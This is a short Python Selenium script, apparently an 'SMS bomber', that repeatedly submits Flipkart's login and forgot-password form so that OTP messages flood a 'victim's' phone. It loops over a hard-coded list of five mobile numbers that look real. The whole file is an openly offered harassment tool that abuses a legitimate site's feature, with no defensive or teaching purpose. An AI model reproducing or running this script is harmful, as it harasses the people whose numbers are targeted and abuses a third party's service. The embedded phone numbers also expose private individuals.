from selenium import webdriver
import time

# create instance of Chrome webdriver

mobile_numbers =["8306062254","7427868230","8769730443","9660010238","9829204279"]


def send_bomber(mobile_number):
	browser = webdriver.Chrome()

	# set the frequency of sms which is approx maximum to 10 per 24 days
	frequency = 30

	# target mobile number, change it to victim's number and
	# also ensure that it's registered on flipkart

	for i in range(frequency):
		browser.get('https://www.flipkart.com/account/login?signup=true')

		# find the element where we have to
		# enter the number using the class name
		number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
        

		# automatically type the target number
		number.send_keys(mobile_number)

		# find the element to send a forgot password
		# request using it's class name
		forgot = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[3]/button')

		# clicking on that element
		forgot.click()

		# set the interval to send each sms
		time.sleep(2)

	# Close the browser
	browser.quit()


for no in mobile_numbers:
	send_bomber(no)